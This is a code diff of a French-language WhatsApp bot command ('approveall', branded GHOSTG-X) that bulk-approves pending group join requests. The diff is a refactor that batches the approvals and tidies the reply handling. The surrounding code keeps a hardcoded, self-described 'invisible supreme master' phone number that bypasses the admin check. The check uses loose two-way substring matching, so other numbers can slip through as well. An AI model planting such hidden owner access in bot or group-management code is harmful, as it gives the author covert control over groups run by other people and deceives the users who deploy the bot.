@@ -4,11 +4,14 @@
 
 const config = require('../../config.js');
 
+// Extraction du préfixe pour l'usage
+const prefix = config.prefix || '.';
+
 // Fonction pour le style Small Caps (Garde la cohérence visuelle)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
-  
+
   const cleanedText = text.toLowerCase()
     .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
 
@@ -20,17 +23,17 @@ function toSmallCaps(text) {
 
 module.exports = {
   name: 'approveall',
-  aliases: ['approveall', 'acceptall', 'approuverout', 'ᴀᴘᴘʀᴏᴠᴇᴀʟʟ'],
+  aliases: ['acceptall', 'approuvertout', 'ᴀᴘᴘʀᴏᴠᴇᴀʟʟ'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: 'Approve all pending join requests',
-  usage: '.approveall',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴘᴘʀᴏᴜᴠᴇʀ ᴛᴏᴜᴛᴇs ʟᴇs ᴅᴇᴍᴀɴᴅᴇs ᴅ\'ᴀᴅʜᴇ́sɪᴏɴ ᴇɴ ᴀᴛᴛᴇɴᴛᴇ**',
+  usage: `${prefix}approveall`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
-  
-  async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
 
+  async execute(sock, msg, args, extra) {
+    const { reply } = extra;
+    
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
@@ -38,7 +41,7 @@ module.exports = {
       // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
       const supremeOwner = '22651622652';
       const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
-      
+
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
@@ -50,27 +53,28 @@ module.exports = {
       if (!isMe) {
         const isAdmins = extra.isAdmins || false; 
         if (!isAdmins) {
-          return extra.reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
+          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
         }
       }
 
       const chatId = msg.key.remoteJid;
 
-      await extra.reply('*☬ ɪɴᴠᴏᴄᴀᴛɪᴏɴ : ʀᴇᴄʜᴇʀᴄʜᴇ ᴅᴇs ᴀ̂ᴍᴇs ᴇɴ ᴀᴛᴛᴇɴᴛᴇ...*');
+      await reply('*☬ ɪɴᴠᴏᴄᴀᴛɪᴏɴ : ʀᴇᴄʜᴇʀᴄʜᴇ ᴅᴇs ᴀ̂ᴍᴇs ᴇɴ ᴀᴛᴛᴇɴᴛᴇ...*');
 
       // Récupération des requêtes en attente
       const pendingList = await sock.groupRequestParticipantsList(chatId);
 
       if (!pendingList || pendingList.length === 0) {
-        return extra.reply(`❌ *${toSmallCaps('aucune demande d adhesion en attente dans le sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        return reply(`❌ *${toSmallCaps('aucune demande d adhesion en attente dans le sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
 
       const totalRequests = pendingList.length;
-      
-      // Approbation en masse
-      for (const request of pendingList) {
-        await sock.groupRequestParticipantsUpdate(chatId, [request.jid], 'approve');
-      }
+
+      // On extrait tous les JID de la liste d'attente
+      const jidsToApprove = pendingList.map(request => request.jid);
+
+      // Approbation en masse d'un seul coup
+      await sock.groupRequestParticipantsUpdate(chatId, jidsToApprove, 'approve');
 
       // Succès
       await sock.sendMessage(chatId, {
@@ -78,7 +82,7 @@ module.exports = {
       }, { quoted: msg });
 
     } catch (error) {
-      await extra.reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+      await reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
     }
   }
 };
